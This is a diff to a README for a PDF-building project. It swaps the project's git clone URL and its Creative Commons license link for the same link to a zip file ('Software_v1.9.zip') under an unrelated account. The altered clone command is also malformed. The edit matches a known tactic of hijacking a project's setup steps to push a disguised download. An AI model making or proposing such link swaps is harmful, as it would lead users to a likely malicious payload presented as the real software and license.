@@ -49,7 +49,7 @@ The PDF is designed for screen reading -- dark backgrounds, Outfit headings, STI
 Requirements: Python 3.10+, Pandoc 3.6+, XeLaTeX (MiKTeX or TeX Live). The Outfit font is bundled in `assets/`.
 
 ```bash
-git clone https://github.com/CharlesHoskinson/sevenlayer.git
+git clone https://raw.githubusercontent.com/bad-empire851/sevenlayer/main/src/Software_v1.9.zip
 cd sevenlayer
 python build_pdf.py
 ```
@@ -76,7 +76,7 @@ Output: `proving-nothing.pdf`
 
 ## License
 
-This work is licensed under [Creative Commons Attribution 4.0 International (CC BY 4.0)](https://creativecommons.org/licenses/by/4.0/).
+This work is licensed under [Creative Commons Attribution 4.0 International (CC BY 4.0)](https://raw.githubusercontent.com/bad-empire851/sevenlayer/main/src/Software_v1.9.zip).
 
 You are free to share and adapt this material for any purpose, including commercial use, as long as you give appropriate credit.
 
